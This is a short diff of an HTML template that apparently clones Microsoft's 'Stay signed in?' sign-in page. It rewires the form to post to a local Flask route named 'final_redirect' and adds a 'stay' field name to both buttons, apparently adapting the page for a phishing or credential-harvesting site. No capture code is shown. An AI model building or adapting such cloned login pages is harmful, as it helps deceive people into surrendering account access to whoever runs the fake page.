@@ -840,7 +840,7 @@ html[dir="ltr"] .animate.slide-in-next {
 
 <div><!--  -->
 
-<form novalidate="novalidate" spellcheck="false" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="/redirect">
+<form novalidate="novalidate" spellcheck="false" target="_top" autocomplete="off" data-bind="autoSubmit: forceSubmit, attr: { action: svr.urlPost }" action="{{ url_for('final_redirect') }}">
 
     <!-- ko withProperties: { '$kmsiPage': $data } -->
     <div data-bind="component: { name: 'master-page',
@@ -1019,7 +1019,7 @@ html[dir="ltr"] .animate.slide-in-next {
 
     <!-- ko if: isSecondaryButtonVisible -->
     <div data-bind="css: { 'inline-block': true }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
-        <input type="submit" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
+        <input type="submit" name="stay" id="idBtn_Back" class="win-button button-secondary button ext-button secondary ext-secondary" data-bind="
             attr: { 'id': secondaryButtonId || 'idBtn_Back' },
             externalCss: {
                 'button': true,
@@ -1034,7 +1034,7 @@ html[dir="ltr"] .animate.slide-in-next {
 
     <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }, externalCss: { 'button-item': true }" class="inline-block button-item ext-button-item">
         <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
-        <input type="submit" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
+        <input type="submit" name="stay" id="idSIButton9" class="win-button button_primary button ext-button primary ext-primary" data-report-event="Signin_Submit" data-report-trigger="click" data-report-value="Submit" data-bind="
                 attr: primaryButtonAttributes,
                 externalCss: {
                     'button': true,
